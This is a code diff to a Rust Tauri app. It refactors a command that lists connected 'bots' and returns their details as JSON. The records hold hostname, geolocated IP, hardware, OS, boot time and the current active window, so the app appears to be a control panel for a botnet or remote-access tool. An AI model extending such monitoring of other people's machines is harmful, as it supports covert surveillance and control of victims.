@@ -1,7 +1,8 @@
 // Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
 use std::{ collections::HashMap, sync::Arc };
 use chrono::{ DateTime, Utc };
-use server::http_server::{ BotMap, ServerHandler };
+use serde_json::json;
+use server::{ http_server::{ BotMap, ServerHandler }, utils::convert_bot_to_frontend };
 use lazy_static::lazy_static;
 use server_vars::types::bot::BotItem;
 use tokio::sync::RwLock;
@@ -14,56 +15,21 @@ mod router;
 lazy_static! {
     pub static ref SERVER_HANDLER: Arc<RwLock<Option<ServerHandler>>> = Arc::new(RwLock::new(None));
 }
-
 #[tauri::command(async)]
-async fn get_all_bots() -> Result<HashMap<String, BotItem>, String> {
+async fn get_bot_items(filter_ids: Vec<String>) -> String {
     let server_ref = SERVER_HANDLER.read().await;
-    if let Some(handler) = server_ref.as_ref() {
-        let bot_map = handler.bot_map.read().await;
+    let handler = server_ref.as_ref().unwrap();
+    let bot_map = handler.bot_map.read().await;
 
-        let bot_item_map: HashMap<String, BotItem> = bot_map
-            .iter()
-            .filter(|(_, bot)| bot.verified)
-            .map(|(id, bot)| {
-                let latest_client_instance = bot.client_instances
-                    .iter()
-                    .max_by_key(|client_instance| client_instance.version)
-                    .unwrap();
+    let bot_item_map: HashMap<String, BotItem> = bot_map
+        .iter()
+        .filter(|(id, bot)| bot.verified && !filter_ids.contains(id))
+        // filter verified, and not already loaded
+        .map(|(id, bot)| { (id.clone(), convert_bot_to_frontend(bot)) })
+        .collect();
 
-                let bot_state = &latest_client_instance.bot_state;
-                let dynamic_info = &bot_state.dynamic_info;
-                let ip_info = &bot_state.ip_info;
-                let hardware_info = &bot_state.hw_info;
-
-                let bot_item = BotItem {
-                    id: id.clone(),
-                    flag: country_emoji
-                        ::flag(&ip_info.country_code.clone())
-                        .unwrap_or(
-                            country_emoji::flag(&ip_info.country.clone()).unwrap_or("🌎".to_owned())
-                        ),
-                    name: bot_state.os_info.host_name.clone().unwrap_or("-".to_owned()),
-                    cpu_brand: hardware_info.cpu_brand.clone(),
-                    ram: format!(
-                        "{:.1} GB",
-                        (hardware_info.total_ram as f64) / (1024.0 * 1024.0 * 1024.0)
-                    ),
-                    ping: "N/A".to_string(), // You might need to calculate this
-                    join_date: bot.join_date.clone(),
-                    system_boot_time: bot_state.os_info.boot_time.clone(),
-                    region: ip_info.region.clone(),
-                    os_info: bot_state.os_info.os_version.clone().unwrap_or("-".to_owned()),
-                    active_window: dynamic_info.active_window.clone(),
-                };
-
-                (id.clone(), bot_item)
-            })
-            .collect();
-
-        return Ok(bot_item_map);
-    } else {
-        return Err("SERVER_HANDLER is None".to_owned());
-    }
+    let json_string = serde_json::to_string(&json!(bot_item_map)).unwrap();
+    return json_string;
 }
 
 #[tauri::command]
@@ -94,7 +60,7 @@ pub fn run() {
     tauri::Builder
         ::default()
         .plugin(tauri_plugin_opener::init())
-        .invoke_handler(tauri::generate_handler![greet, get_all_bots])
+        .invoke_handler(tauri::generate_handler![greet, get_bot_items])
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
 }
